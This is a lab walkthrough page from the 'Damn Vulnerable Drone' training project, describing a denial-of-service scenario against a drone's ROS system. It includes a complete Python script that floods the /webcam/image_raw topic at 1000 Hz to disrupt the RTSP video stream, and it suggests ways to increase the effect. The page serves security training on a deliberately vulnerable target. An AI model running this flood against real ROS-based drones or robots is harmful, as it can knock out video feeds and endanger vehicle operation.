<i>Flooding the ROS topic to disrupt a the drone's RTSP stream.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Denial of Service > ROS Topic Flood Attack

# Description

This attack involves flooding a ROS topic with large amounts of data to overwhelm the system's resources, leading to disruption of services such as an RTSP stream. In this scenario, we target the <code>/webcam/image_raw</code> topic to disrupt the video stream being handled over ROS.

# Resources

- <a href="https://hub.docker.com/r/osrf/ros">ROS Noetic Docker Image</a>  
- <a href="https://wiki.ros.org/noetic">ROS Documentation</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Set Up the ROS Docker Container</h3>
<pre><code class="code mb-3 mt-3">sudo docker pull ros:noetic-ros-base
</code></pre>

<p>Then run the container and assign it to the simulator network:</p>

<pre><code class="code mb-3 mt-3">docker run -it --network=simulator --ip=10.13.0.10 --name ros_noetic_container ros:noetic-ros-base bash
</code></pre>

---

<h3>Step 2. Configure ROS Environment</h3>
<p>Inside the container, export the ROS environment variables:</p>

<pre><code class="code mb-3 mt-3">export ROS_MASTER_URI=http://10.13.0.5:11311
export ROS_IP=10.13.0.10
source /opt/ros/noetic/setup.bash
</code></pre>

---

<h3>Step 3. Install Python and Required Packages</h3>
<pre><code class="code mb-3 mt-3">apt-get update
apt-get install python3 python3-pip nano
</code></pre>

---

<h3>Step 4. Create the ROS Flood Script</h3>
<p>Save the following Python3 script as <code>ros-topic-flood.py</code>:</p>

<pre><code class="code mb-3 mt-3">#!/usr/bin/env python3

import rospy
from sensor_msgs.msg import Image
import numpy as np

def flood_topic():
    rospy.init_node('image_flooder', anonymous=True)
    pub = rospy.Publisher('/webcam/image_raw', Image, queue_size=10)
    rate = rospy.Rate(1000)  # 1000 Hz flooding

    while not rospy.is_shutdown():
        img = Image()
        img.height = 480
        img.width = 640
        img.encoding = "rgb8"
        img.is_bigendian = 0
        img.step = img.width * 3
        img.data = np.random.bytes(img.step * img.height)
        pub.publish(img)
        rate.sleep()

if __name__ == '__main__':
    try:
        flood_topic()
    except rospy.ROSInterruptException:
        pass
</code></pre>

---

<h3>Step 5. Execute the Flood Script</h3>
<pre><code class="code mb-3 mt-3">python3 ros-topic-flood.py
</code></pre>

<p>This script floods <code>/webcam/image_raw</code> at 1000 Hz, disrupting the RTSP stream and consuming system resources.</p>

---

<h3>Step 6. Monitor the Attack</h3>
<p>Check the ROS master logs and attempt to view the RTSP stream to verify disruption. You may adjust <code>rate = rospy.Rate(x)</code> or payload size to increase effect.</p>

---

<h3>Step 7. Stop the Attack</h3>
<p>To stop the flooding:</p>

<pre><code class="code mb-3 mt-3">Ctrl+C</code></pre>

<p>in the terminal running the flood script.</p>

</details>
